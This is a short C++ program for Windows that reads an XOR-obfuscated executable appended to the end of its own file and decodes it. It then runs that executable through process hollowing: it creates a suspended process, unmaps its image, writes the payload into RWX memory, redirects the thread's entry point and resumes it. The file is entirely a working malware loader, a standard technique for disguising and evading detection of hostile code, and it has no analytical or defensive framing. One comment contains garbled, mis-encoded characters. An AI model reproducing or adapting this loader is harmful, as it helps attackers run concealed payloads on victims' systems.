#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>

using namespace std;

void xormethod(vector<char>& data, char key) {
    for (char& byte : data) {
        byte ^= key;
    }
}

int main() {
    cout << "hello program2" << endl;

    ifstream file("./retrofitting.exe", ios::binary | ios::ate);
    SIZE_T fileSize = file.tellg(); 
    file.seekg(0, ios::beg);         
    vector<char> buffer(fileSize);  
    file.read(buffer.data(), fileSize);
    file.close();

    SIZE_T program1_size = 1921163;  // 1.83 MB (1,921,163 ×Ö½Ú)
    SIZE_T offset = fileSize - program1_size;
    vector<char> Data(buffer.begin() + offset, buffer.begin() + offset + program1_size);

    xormethod(Data, 0x40);

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    CreateProcessA("./retrofitting.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    LPVOID pebBase = (LPVOID)(ctx.Rdx);
    LPVOID imageBase;
    ReadProcessMemory(pi.hProcess, (PBYTE)pebBase + 0x10, &imageBase, sizeof(LPVOID), NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)Data.data();
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(Data.data() + dosHeader->e_lfanew);
    LPVOID newImageBase = (LPVOID)(ntHeaders->OptionalHeader.ImageBase);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtUnmapViewOfSection = (NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(ntdll, "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, imageBase);

    LPVOID allocMem = VirtualAllocEx(pi.hProcess, newImageBase, program1_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(pi.hProcess, allocMem, Data.data(), program1_size, NULL);

    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(Data.data() + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++sectionHeader) {
        LPVOID sectionAddr = (LPVOID)((ULONGLONG)allocMem + sectionHeader->VirtualAddress);
        WriteProcessMemory(pi.hProcess, sectionAddr, Data.data() + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL);
    }

    ctx.Rip = (ULONGLONG)allocMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    return 0;
}

